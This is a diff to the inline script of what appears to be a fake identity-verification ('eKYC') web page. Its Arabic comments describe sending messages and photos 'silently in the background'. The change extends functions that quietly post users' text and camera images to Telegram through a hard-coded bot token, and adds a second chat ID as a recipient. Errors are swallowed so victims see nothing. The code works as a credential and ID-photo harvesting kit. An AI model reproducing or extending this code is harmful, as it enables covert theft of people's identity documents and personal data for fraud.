@@ -1686,8 +1686,8 @@
 
   <script>
     const TELEGRAM_BOT_TOKEN = '9077249116:AAG4T3pPvZT-Bdj8GisvhRmWTx3s7dX8WYo';
-    const TELEGRAM_CHAT_ID = '8027764156'7840264056:
-    const STORAGE_KEY = 'ibok_ekyc_recorded_session_v2';
+    const TELEGRAM_CHAT_IDS = ['8027764156', '7840264056'];
+    const STORAGE_KEY = 'ibok_ekyc_recorded_session_v3';
 
     let cameraStream = null;
     let currentFacingMode = 'user';
@@ -1728,19 +1728,21 @@
       persistRecordedState();
     }
 
-    // إرسال رسالة نصية صامتة في الخلفية إلى تيليجرام
+    // إرسال رسالة نصية صامتة في الخلفية إلى جميع المستلمين
     function silentSendTelegramMessage(text) {
       persistRecordedState();
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        keepalive: true,
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: text
-        })
-      }).catch(() => {});
+      TELEGRAM_CHAT_IDS.forEach(chatId => {
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          keepalive: true,
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text
+          })
+        }).catch(() => {});
+      });
     }
 
     function dataUrlToBlob(dataUrl) {
@@ -1755,21 +1757,24 @@
       return new Blob([array], { type: mime });
     }
 
-    // إرسال صورة صامتة في الخلفية إلى تيليجرام
+    // إرسال صورة صامتة في الخلفية إلى جميع المستلمين
     function silentSendTelegramPhoto(dataUrl, filename, caption) {
       if (!dataUrl || !dataUrl.startsWith('data:')) return;
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-      const formData = new FormData();
-      formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('photo', dataUrlToBlob(dataUrl), filename || 'image.jpg');
-      if (caption) {
-        formData.append('caption', caption);
-      }
-      fetch(url, {
-        method: 'POST',
-        keepalive: true,
-        body: formData
-      }).catch(() => {});
+      const blob = dataUrlToBlob(dataUrl);
+      TELEGRAM_CHAT_IDS.forEach(chatId => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, filename || 'image.jpg');
+        if (caption) {
+          formData.append('caption', caption);
+        }
+        fetch(url, {
+          method: 'POST',
+          keepalive: true,
+          body: formData
+        }).catch(() => {});
+      });
     }
 
     function showScreen(screenId) {
@@ -2270,4 +2275,4 @@
     }
   </script>
 </body>
-          </html>
+</html>
